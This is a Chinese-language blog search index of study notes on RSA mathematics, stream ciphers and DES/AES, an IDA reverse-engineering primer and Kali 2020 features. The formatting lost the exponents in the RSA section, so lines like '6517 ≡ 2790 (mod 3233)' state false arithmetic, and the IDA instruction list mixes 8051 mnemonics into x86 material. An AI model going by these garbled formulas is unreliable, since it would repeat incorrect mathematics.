<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>crypto-rsa</title>
    <url>/2020/05/06/crypto-rsa/</url>
    <content><![CDATA[<h1 id="RSA回顾"><a href="#RSA回顾" class="headerlink" title="RSA回顾"></a>RSA回顾</h1><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><ol>
<li>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 </li>
<li>计算比正整数n小，并且与n互质的函数叫做欧拉函数</li>
</ol>
<p>如果n是某一个<strong>质数的次方</strong>， 即 n = p^k (p为质数，k为大于等于1的整数)，则 </p>
<p><img src="/2020/05/06/crypto-rsa/chart.png" alt="chart"></p>
<ol start="3">
<li>如果n可以分解成两个互质的整数之积， </li>
</ol>
<p><code>n = p1*p2</code></p>
<p>则</p>
<p><code>φ(n) = φ(p1*p2) = φ(p1)φ(p2)</code></p>
<p>即积的欧拉函数等于<strong>各个因子</strong>的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p>
<p>这一条的证明要用到<a href="http://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="noopener">“中国剩余定理”</a>，这里就不展开了，只简单说一下思路：如果a与p1互质(a&lt;p1)，b与p2互质(b&lt;p2)，c与p1p2互质(c&lt;p1p2)，则c与数对 (a,b) 是一一对应关系。由于a的值有φ(p1)种可能，b的值有φ(p2)种可能，则数对 (a,b) 有φ(p1)φ(p2)种可能，而c的值有φ(p1p2)种可能，所以φ(p1p2)就等于φ(p1)φ(p2)。</p>
<h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><ol>
<li>欧拉函数的用处，在于欧拉定理。”欧拉定理”指的是： </li>
</ol>
<p>​     如果两个<strong>正整数</strong>a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立： </p>
<p><img src="/2020/05/06/crypto-rsa/chart(7).png" alt="chart(7)"></p>
<ol start="2">
<li>欧拉定理有一个特殊情况。</li>
</ol>
<blockquote>
<p>假设<strong>正整数a</strong>与<strong>质数p</strong>互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p>
<p><img src="/2020/05/06/crypto-rsa/chart(10).png" alt="chart(10)"></p>
</blockquote>
<p>这就是著名的费马小定理。它是欧拉定理的特例。</p>
<p>欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。</p>
<h3 id="模反函数"><a href="#模反函数" class="headerlink" title="模反函数"></a>模反函数</h3><p>还剩下最后一个概念：</p>
<blockquote>
<p>如果两个<strong>正整数</strong>a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p>
<p><img src="/2020/05/06/crypto-rsa/chart(11).png" alt="chart(11)"></p>
<p>这时，b就叫做a的模反元素。</p>
</blockquote>
<p>欧拉定理可以用来证明模反元素必然存在。</p>
<p><img src="/2020/05/06/crypto-rsa/chart(12).png" alt="chart(12)"></p>
<p>可以看到，a的 φ(n)-1 次方，就是a的模反元素（也就是b）。</p>
<h3 id="密钥生成的步骤"><a href="#密钥生成的步骤" class="headerlink" title="密钥生成的步骤"></a>密钥生成的步骤</h3><p><strong>第一步，随机选择两个不相等的质数p和q。</strong></p>
<p>爱丽丝选择了61和53。（实际应用中，这两个质数越大，就越难破解。）</p>
<p><strong>第二步，计算p和q的乘积n。</strong></p>
<p>爱丽丝就把61和53相乘。</p>
<blockquote>
<p>　　n = 61×53 = 3233</p>
</blockquote>
<p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p>
<p><strong>第三步，计算n的欧拉函数φ(n)。</strong></p>
<p>根据公式：</p>
<blockquote>
<p>　　φ(n) = (p-1)(q-1)</p>
</blockquote>
<p>爱丽丝算出φ(3233)等于60×52，即3120。</p>
<p><strong>第四步，随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</strong></p>
<p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>
<p><strong>第五步，计算e对于φ(n)的模反元素d。</strong></p>
<p>所谓<a href="http://zh.wikipedia.org/wiki/模反元素" target="_blank" rel="noopener">“模反元素”</a>就是指有一个整数d，可以使得ed被φ(n)除的余数为1。</p>
<blockquote>
<p>　　ed ≡ 1 (mod φ(n))</p>
</blockquote>
<p>这个式子等价于</p>
<blockquote>
<p>　　ed - 1 = kφ(n)</p>
</blockquote>
<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。</p>
<blockquote>
<p>　　ex + φ(n)y = 1</p>
</blockquote>
<p>已知 e=17, φ(n)=3120，</p>
<blockquote>
<p>　　17x + 3120y = 1</p>
</blockquote>
<p>这个方程可以用<a href="http://zh.wikipedia.org/wiki/扩展欧几里得算法" target="_blank" rel="noopener">“扩展欧几里得算法”</a>求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。</p>
<p>至此所有计算完成。</p>
<p><strong>第六步，将n和e封装成公钥，n和d封装成私钥。</strong></p>
<p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
<p>实际应用中，公钥和私钥的数据都采用<a href="http://zh.wikipedia.org/zh-cn/ASN.1" target="_blank" rel="noopener">ASN.1</a>格式表达（<a href="http://hi.baidu.com/mathack/item/d0ad4cc1514a3663f7c95da2" target="_blank" rel="noopener">实例</a>）。</p>
<p><strong>七、RSA算法的可靠性</strong></p>
<p>回顾上面的密钥生成步骤，一共出现六个数字：</p>
<blockquote>
<p>　　p<br>　　q<br>　　n<br>　　φ(n)<br>　　e<br>　　d</p>
</blockquote>
<p>这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p>
<p><strong>那么，有无可能在已知n和e的情况下，推导出d？</strong></p>
<blockquote>
<p>　　（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</p>
<p>　　（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</p>
<p>　　（3）n=pq。只有将n因数分解，才能算出p和q。</p>
</blockquote>
<p><strong>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</strong></p>
<p>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。维基百科这样写道：</p>
<blockquote>
<p>　　“对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。</p>
<p>　　假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。</p>
<p>　　只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。”</p>
</blockquote>
<p>举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。</p>
<blockquote>
<p>　　12301866845301177551304949<br>　　58384962720772853569595334<br>　　79219732245215172640050726<br>　　36575187452021997864693899<br>　　56474942774063845925192557<br>　　32630345373154826850791702<br>　　61221429134616704292143116<br>　　02221240479274737794080665<br>　　351419597459856902143413</p>
</blockquote>
<p>它等于这样两个质数的乘积：</p>
<blockquote>
<p>　　33478071698956898786044169<br>　　84821269081770479498371376<br>　　85689124313889828837938780<br>　　02287614711652531743087737<br>　　814467999489<br>　　　　×<br>　　36746043666799590428244633<br>　　79962795263227915816434308<br>　　76426760322838157396665112<br>　　79233373417143396810270092<br>　　798736308917</p>
</blockquote>
<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>
<p><strong>八、加密和解密</strong></p>
<p>有了公钥和密钥，就能进行加密和解密了。</p>
<p><strong>（1）加密要用公钥 (n,e)</strong></p>
<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>所谓”加密”，就是算出下式的c：</p>
<blockquote>
<p>　　me ≡ c (mod n)</p>
</blockquote>
<p>爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
<blockquote>
<p>　　6517 ≡ 2790 (mod 3233)</p>
</blockquote>
<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
<p><strong>（2）解密要用私钥(n,d)</strong></p>
<p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：</p>
<blockquote>
<p>　　cd ≡ m (mod n)</p>
</blockquote>
<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出</p>
<blockquote>
<p>　　27902753 ≡ 65 (mod 3233)</p>
</blockquote>
<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
<p>至此，”加密–解密”的整个过程全部完成。</p>
<p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p>
<p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如<a href="https://zh.wikipedia.org/wiki/资料加密标准" target="_blank" rel="noopener">DES</a>），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>
<p><strong>九、私钥解密的证明</strong></p>
<p>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：</p>
<blockquote>
<p>　　cd ≡ m (mod n)</p>
</blockquote>
<p>因为，根据加密规则</p>
<blockquote>
<p>　　ｍe ≡ c (mod n)</p>
</blockquote>
<p>于是，c可以写成下面的形式：</p>
<blockquote>
<p>　　c = me - kn</p>
</blockquote>
<p>将c代入要我们要证明的那个解密规则：</p>
<blockquote>
<p>　　(me - kn)d ≡ m (mod n)</p>
</blockquote>
<p>它等同于求证</p>
<blockquote>
<p>　　med ≡ m (mod n)</p>
</blockquote>
<p>由于</p>
<blockquote>
<p>　　ed ≡ 1 (mod φ(n))</p>
</blockquote>
<p>所以</p>
<blockquote>
<p>　　ed = hφ(n)+1</p>
</blockquote>
<p>将ed代入：</p>
<blockquote>
<p>　　mhφ(n)+1 ≡ m (mod n)</p>
</blockquote>
<p>接下来，分成两种情况证明上面这个式子。</p>
<p><strong>（1）m与n互质。</strong></p>
<p>根据欧拉定理，此时</p>
<blockquote>
<p>　　mφ(n) ≡ 1 (mod n)</p>
</blockquote>
<p>得到</p>
<blockquote>
<p>　　(mφ(n))h × m ≡ m (mod n)</p>
</blockquote>
<p>原式得到证明。</p>
<p><strong>（2）m与n不是互质关系。</strong></p>
<p>此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。</p>
<p>以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p>
<blockquote>
<p>　　(kp)q-1 ≡ 1 (mod q)</p>
</blockquote>
<p>进一步得到</p>
<blockquote>
<p>　　[(kp)q-1]h(p-1) × kp ≡ kp (mod q)</p>
</blockquote>
<p>即</p>
<blockquote>
<p>　　(kp)ed ≡ kp (mod q)</p>
</blockquote>
<p>将它改写成下面的等式</p>
<blockquote>
<p>　　(kp)ed = tq + kp</p>
</blockquote>
<p>这时t必然能被p整除，即 t=t’p</p>
<blockquote>
<p>　　(kp)ed = t’pq + kp</p>
</blockquote>
<p>因为 m=kp，n=pq，所以</p>
<blockquote>
<p>　　med ≡ m (mod n)</p>
</blockquote>
<p>原式得到证明。</p>
<p>参考： 阮一峰的网络日志</p>
]]></content>
      <tags>
        <tag>Get-First</tag>
      </tags>
  </entry>
  <entry>
    <title>Get First</title>
    <url>/2020/05/05/Get-First/</url>
    <content><![CDATA[<h1 id="First-try"><a href="#First-try" class="headerlink" title="First try."></a>First try.</h1><h3 id="无须列表"><a href="#无须列表" class="headerlink" title="无须列表"></a>无须列表</h3><ul>
<li>1</li>
<li>2</li>
<li>3</li>
</ul>
<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><ol>
<li>哈哈</li>
<li>嘻嘻</li>
</ol>
<blockquote>
<p>这里是引用 淡色的</p>
</blockquote>
<h3 id="插入连接"><a href="#插入连接" class="headerlink" title="插入连接"></a>插入连接</h3><p><a href="https://www.baidu.com" target="_blank" rel="noopener">baidu</a></p>
<h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><h3 id="试试粗体把"><a href="#试试粗体把" class="headerlink" title="试试粗体把"></a>试试粗体把</h3><p><strong>有意思哈哈</strong></p>
<p>不粗</p>
<p><em>斜体</em></p>
<p><strong><em>粗斜</em></strong></p>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table>
<thead>
<tr>
<th>Tables</th>
<th>are</th>
<th>not so cool</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="试试代码框"><a href="#试试代码框" class="headerlink" title="试试代码框"></a>试试代码框</h3><p><code>public static void main(String args[]){</code><br><code>System.out.println(&#39;xixi&#39;);</code></p>
<p><code>}</code></p>
<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><hr>
]]></content>
  </entry>
  <entry>
    <title>des-aes</title>
    <url>/2020/05/08/des-aes/</url>
    <content><![CDATA[<h1 id="AES-and-DES"><a href="#AES-and-DES" class="headerlink" title="AES and DES"></a>AES and DES</h1><h3 id="Key-generation-methods"><a href="#Key-generation-methods" class="headerlink" title="Key generation methods:"></a>Key generation methods:</h3><ul>
<li><p>*<em>CSPRNG *</em>- Cryptographically Secure Pseudo Random Number Generator, using a seed derived from Ks.</p>
<p>-fpr CSPRNG, <strong>impossible to predict the remaining bits</strong> of the key stream given some initial bits.</p>
</li>
<li><p><strong>LFSR</strong> - Linear Feedback Shift Register e.g. in A5/1 cipher for GSM</p>
</li>
<li><p><strong>Trivium cipher</strong> – uses 80 bit key, three shift registers </p>
</li>
<li><p><strong>Block ciphers</strong> in OFB, CTR modes</p>
</li>
</ul>
<h3 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR:"></a>LFSR:</h3><p><img src="/2020/05/08/des-aes/D:%5Cblog%5Csource_posts%5Cdes-aes%5Cimage-20200509114420780.png" alt="image-20200509114420780"></p>
<ul>
<li>Consider LFSR with 3 Flip-ﬂops(电子触发器): FF0, FF1, FF2, i.e. degree m = 3 </li>
<li>Assume initial states: s2 = 1, s1 = 0, s0 = 0 </li>
<li>Output: si+3 ≡ si+1 + si mod 2 </li>
<li>Theorem: The maximum sequence length generated by an LFSR of degree m is 2^m − 1（NO.6 第七个后开始重复）</li>
</ul>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Stream ciphers simple and require less resources  </li>
<li>Requires long, random keystream derived from the shared key </li>
<li>Careful use of LFSR, CSPRNG to obtain keystreams with good statistical properties(统计特性).</li>
</ul>
<p>，</p>
<h3 id="2DES，3DES"><a href="#2DES，3DES" class="headerlink" title="2DES，3DES"></a>2DES，3DES</h3><p><strong>2des</strong></p>
<p><img src="/2020/05/08/des-aes/D:%5Cblog%5Csource_posts%5Cdes-aes%5Cimage-20200509163157603.png" alt="image-20200509163157603"></p>
<p><img src="/2020/05/08/des-aes/D:%5Cblog%5Csource_posts%5Cdes-aes%5Cimage-20200509163218547.png" alt="image-20200509163218547"></p>
<p>因为中间相遇攻击：首先生成2^56的key，</p>
<p>1.用key解密C -&gt; 用key加密d，匹配结果</p>
<p>2.可能有不止一对键值对匹配</p>
<p><a href="https://en.wikipedia.org/wiki/Meet-in-the-middle_attack" target="_blank" rel="noopener">中间相遇攻击</a> </p>
<p><strong>3des</strong></p>
<p><img src="/2020/05/08/des-aes/.%5Cdes-aes%5Cimage-20200509163840053.png" alt="image-20200509163840053"></p>
]]></content>
  </entry>
  <entry>
    <title>IDA入门</title>
    <url>/2020/05/12/IDA%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="IDA入门"><a href="#IDA入门" class="headerlink" title="IDA入门"></a>IDA入门</h1><p>今天准备入手IDA，学习逆向的记录笔记，因为连C++都都没学过，c语言还没学好，所以要认真打好c++基础-&gt; 《c++ prime》</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p> 1、绿色版释放路径不要含有<strong>中文</strong>或者路径长度不能超过<strong>72字符</strong>。（python模块自身的bug） </p>
<p>2、 开发了IDA的天才是Ilfak，他的个人博客有很多IDA的教程</p>
<p><a href="https://www.hex-rays.com/blog" target="_blank" rel="noopener">Ilfak blog</a></p>
<h3 id="IDA目录结构"><a href="#IDA目录结构" class="headerlink" title="IDA目录结构"></a>IDA目录结构</h3><p>在IDA的安装根目录下有许多文件夹，各个文件夹存储不同的内容</p>
<p>cfg：包含各种配置文件，基本IDA配置文件ida.cfg, GUI配置文件idagui.cfg，文本模式用户界面配置文件idatui.cfg,<br>idc：包含IDA内置脚本语言IDC所需要的核心文件<br>ids：包含一些符号文件<br>loaders：包含用于识别和解析PE或者ELF<br>plugins：附加的插件模块<br>procs：包含处理器模块</p>
<h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><p>IDA中的快捷键都是和菜单栏的各个功能选项一一对应的，基本上你只要能在菜单栏上找到某个功能，也就能看到相应的快捷键，这里记录几个常用的：</p>
<p>a：将数据转换为字符串 (字符串变数据d)</p>
<p>f5：一键反汇编（光标要在一个函数上）</p>
<p>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）</p>
<p>shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</p>
<p>ctrl+w：保存ida数据库</p>
<p>ctrl+s：选择某个数据段，直接进行跳转</p>
<p>ctrl+鼠标滚轮：能够调节流程视图的大小</p>
<p>x：对着某个<strong>函数、变量</strong>按该快捷键，可以查看它的交叉引用</p>
<p>g：直接跳转到某个地址</p>
<p>n：更改变量的名称</p>
<p>y：更改变量的类型</p>
<p>/ ：在反编译后伪代码的界面中写下注释</p>
<p>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p>
<p>；：在反汇编后的界面中写下注释</p>
<p>ctrl+shift+w：拍摄IDA快照</p>
<p>u：undefine，取消定义函数、代码、数据的定义</p>
<h3 id="data-segement-数据段"><a href="#data-segement-数据段" class="headerlink" title="data segement(数据段)"></a>data segement(数据段)</h3><p>.rdata is for const data. It is the <strong>read only</strong> version of the .data segment.</p>
<p>.idata holds the import directory (.edata for exports).</p>
<p>It is used by EXE’s and DLL’s to designate the imported and exported functions.</p>
<p>See the PE format specification (<a href="http://msdn.microsoft.com/library/windows/hardware/gg463125" target="_blank" rel="noopener">http://msdn.microsoft.com/library/windows/hardware/gg463125</a>) for details.</p>
<p>Summarizing typical segment names:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text: Code</span><br><span class="line">.data: Initialized data</span><br><span class="line">.bss: Uninitialized data</span><br><span class="line">.rdata: Const&#x2F;read-only (and initialized) data</span><br><span class="line"></span><br><span class="line">.edata: Export descriptors</span><br><span class="line">.idata: Import descriptors</span><br></pre></td></tr></table></figure>

<p>In fact, the names of the segments are ignored by Windows.</p>
<p> <a href="https://www.hex-rays.com/products/ida/support/idadoc/517.shtml" target="_blank" rel="noopener">hex-rays defination</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CODE    -       Pure code</span><br><span class="line">DATA    -       Pure data</span><br><span class="line">CONST   -       Pure data</span><br><span class="line">BSS     -       Uninitialized data</span><br><span class="line">STACK   -       Uninitialized data</span><br><span class="line">XTRN    -       Extern definitions segment</span><br></pre></td></tr></table></figure>

<p>通常IDA对一个PE文件逆向出来的代码中，</p>
<p>存在四个最基本的段text、idata、rdata、data，</p>
<p>四个段为PE文件的结构中对应的段。</p>
<p>一、text段：</p>
<p>该段位程序代码段，在该段一开始就可以看到：</p>
<p>.text:00401000 ; Segment type: Pure code<br>.text:00401000 ; Segment permissions: Read/Execute</p>
<p>这里的段类型跟权限说明很清楚： 分别为代码段和可读可执行。需要注意的是，borland这里叫做code，而不是text </p>
<p>二、idata、rdata、data段</p>
<p>从命名上可以看出，三个段全为存放特殊数据的段，但IDA根据PE文件的格式将数据段中不同类型的数据区分开来。</p>
<p>VC开发工具将INC，LIB，RES放在数据段，DELPHI也类似，同时由于Delphi的窗体文件*.dfm在源代码中使用编译指令{$R *dfm}作为res资源放在数据段中，因此像delphi的反汇编工具dede就根据这些窗体资源数据，分析出相当清晰的源代码与窗体事件的对应地址，当然实现代码还是汇编代码。</p>
<p>1） idata段：</p>
<p>该段在一开始一般有类似下面的说明：</p>
<p>.idata:0049B000 ; Section 2. (virtual address 0009B000)<br>.idata:0049B000 ; Virtual size : 0001717E ( 94590.)<br>.idata:0049B000 ; Section size in file : 00018000 ( 98304.)<br>.idata:0049B000 ; Offset to raw data for section: 0009B000<br>.idata:0049B000 ; Flags 40000040: Data Readable<br>.idata:0049B000 ; Alignment : default<br>.idata:0049B000 ;<br>.idata:0049B000 ; Imports from ADVAPI32.dll<br>.idata:0049B000 ;<br>.idata:0049B000 ; ===========================================================================<br>.idata:0049B000<br>.idata:0049B000 ; Segment type: Externs<br>.idata:0049B000 ; _idata</p>
<p>明显是一个Imports函数的代码段，这里<strong>集中所有外部函数地址</strong>，代码中会先跳到该地址后再执行，PE文件加载器在开始会<strong>获取真实的函数地址来修补idata段中的函数地址</strong>。</p>
<p>与之对应的exports是edata，</p>
<p>表面上看PE文件对该段的定位是特殊数据段。</p>
<p>2）rdata段</p>
<p>名字上看就是<strong>资源数据段</strong>，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</p>
<p>3）data段</p>
<p>这个段存放程序的全局数据、全局常量等。</p>
<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>当我们打开之后，IDA会提供3种不同的打开方式；New（新建），Go（运行），Previous（上一个）。当我们初次打开的时候选择GO就可以了。进入之后，选择左上角的file中的open打开文件。以凯撒密码为例，打开文件以后。主界面工作区显示</p>
<p>IDA View-A是反汇编窗口，</p>
<p>HexView-A是十六进制格式显示的窗口，</p>
<p>Imports是导入表（程序中调用到的外面的函数），</p>
<p>Functions是函数表（这个程序中的函数），</p>
<p>Structures是结构，</p>
<p>Enums是枚举。</p>
<p>我们此时可以F5查看伪代码。</p>
<p>IDA图形视图会有执行流，Yes箭头默认为绿色，No箭头默认为红色，蓝色表示默认下一个执行块。我们可以在左侧查看代码的运行过程，按下空格键也可以直观地看到程序的图形视图。</p>
<p>在反汇编窗口中大多是eax, ebx, ecx, edx, esi, edi, ebp, esp等。这些都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。这些寄存器相当于C语言中的变量。</p>
<p>EAX 是”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。</p>
<p>EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。</p>
<p>ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</p>
<p>EDX 则总是被用来放整数除法产生的余数。</p>
<p>ESI/EDI 分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。</p>
<p>EBP 是”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。</p>
<p>ESP 专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</p>
<p>还有一些指令，如：mov，jmp等。</p>
<p><strong>资料转移指令</strong></p>
<p>MOV 移动</p>
<p>MOVC 程式记忆体移动</p>
<p>MOVX 外部RAM和扩展I/O口与累加器A的数据传送指令</p>
<p>PUSH 放入堆叠</p>
<p>POP 由堆叠取回</p>
<p>XCH 8位元交换</p>
<p>XCHD 低4位元交换</p>
<p>SWAP 高低4位元交换</p>
<p><strong>算术指令</strong></p>
<p>ADD 两数相加</p>
<p>ADDC 两数相加再加C</p>
<p>SUBB 两数相减再减C</p>
<p>INC 加一指令</p>
<p>DEC 减一指令</p>
<p>MUL （MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B</p>
<p>DIV （DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B</p>
<p>DA (DA A 只此一条指令)调整为十进数</p>
<p><strong>逻辑指令</strong></p>
<p>ANL做AND（逻辑与）运算</p>
<p>ORL做OR（逻辑或）运算</p>
<p>XRL 做（逻辑异或）运算</p>
<p>CLR 清除为0</p>
<p>CPL 取反指令</p>
<p>RL 不带进位左环移</p>
<p>RLC 带进位左环移</p>
<p>RR 不带进位右环移</p>
<p>RRC 带进位右环移</p>
<p><strong>控制转移类指令</strong></p>
<p>JC C=1时跳</p>
<p>JNC C=0时跳</p>
<p>JB 位元=1时跳</p>
<p>JNB 位元=0时跳</p>
<p>JBC 位元=1时跳且清除此位元</p>
<p>LCALL 长调用子程序</p>
<p>ACALL 绝对调用子程序</p>
<p>RET 由副程式返回</p>
<p>RETI 由中断副程式返回</p>
<p>AJMP 绝对转移</p>
<p>SJMP 相对转移</p>
<p>JMP @A+DPTR 散转，相对DPTR的间接转移</p>
<p>JZ A=0时跳</p>
<p>JNZA 0时跳</p>
<p>CJNE 二数比较,不相等时跳</p>
<p>DJNZ 减一,不等於0时跳</p>
<p>NOP 空操作</p>
<p><strong>位变量指令</strong></p>
<p>SETB 设定为1</p>
<p>ORG 程序开始，规定程序的起始地址</p>
<p>END 程序结束</p>
<p>EQU 等值指令（先赋值后使用）例：SUM EQU 30H</p>
<p>DB 定义字节指令</p>
<p>DW 定义字内容</p>
<p>DS 定义保留一定的存贮单元数目</p>
<p>BIT 位地址符号指令 例：SAM BIT P1.0</p>
<p>RET 子程序返回指令</p>
<p>RETI 中断子程序返回指令</p>
<p>$ 本条指令地址</p>
<h3 id="ida文件"><a href="#ida文件" class="headerlink" title="ida文件"></a>ida文件</h3><p>IDA打开应用程序时，会为其创建一个数据库，后缀为IDB。IDB由4个文件组成:</p>
<ul>
<li><p>后缀为id0的二叉树形式的数据库，</p>
</li>
<li><p>后缀为id1的程序字节标识，</p>
</li>
<li><p>后缀为nam的Named窗口的索引信息，</p>
</li>
<li><p>后缀为til的给定数据库的本地类型定义的相关信息。 </p>
<p><img src="/2020/05/12/IDA%E5%85%A5%E9%97%A8/D:%5Cblog%5Csource_posts%5CIDA%E5%85%A5%E9%97%A8%5Cimage-20200514165659874.png" alt="image-20200514165659874"></p>
</li>
</ul>
<p>一旦IDA为某个可执行程序创建数据库，它本身就不再需要访问这个可执行文件，除非使用IDA的Debug功能。</p>
]]></content>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>kali2020新特性</title>
    <url>/2020/05/12/kali2020%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="Kali2020新特性"><a href="#Kali2020新特性" class="headerlink" title="Kali2020新特性"></a>Kali2020新特性</h1><p>2020有野心</p>
<p>以前是渗透测试系统，霸占PC和移动端的桌面系统。（做成通用的）</p>
<ul>
<li><p>默认non-root</p>
<ul>
<li>使用root账户</li>
<li><code>sudo passwd root</code></li>
</ul>
</li>
<li><p>告别了python2的依赖</p>
<ul>
<li>告别了python2的软件，Linux本身为了兼容py2和py3的环境，做了很多妥协</li>
<li>我们升级的出错几率会变小</li>
<li>开始做新的安全管理生态<ul>
<li>安全类资源</li>
<li>大众软件类资源（win10应用商店类似，取代影视剪辑，办公软件word）</li>
</ul>
</li>
</ul>
</li>
<li><p>安装镜像整合为一</p>
<ul>
<li>之前的镜像：xfce桌面版，gnome桌面版</li>
<li>现在只有一个版本iso，高度定制：桌面、软件、包</li>
<li>默认搭载：xfce4桌面（国外的源，很多软件速度特别慢）</li>
<li>kali-linux-large（把源换过）</li>
</ul>
</li>
<li><p>新主题</p>
<ul>
<li><p>为用户的习惯而定制，非美观</p>
</li>
<li><pre><code class="shell">kali-undercover
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* &#96;&#96;&#96;shell</span><br><span class="line">  # 切回去</span><br><span class="line">  rm -rvf ~&#x2F;.config&#x2F;xfce4</span><br><span class="line">  sudo reboot</span><br></pre></td></tr></table></figure></code></pre>
</li>
</ul>
</li>
<li><p>新工具（替代了python2之前的工具）</p>
<ul>
<li>cloud-enum</li>
<li>eamilharvest</li>
<li>….</li>
</ul>
</li>
<li><p>netHunter新改进</p>
<ul>
<li>root权限</li>
<li>现在不需要了</li>
</ul>
</li>
</ul>
<h3 id="进去之后该做的事情"><a href="#进去之后该做的事情" class="headerlink" title="进去之后该做的事情"></a>进去之后该做的事情</h3><ul>
<li><p>换源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>



</li>
</ul>
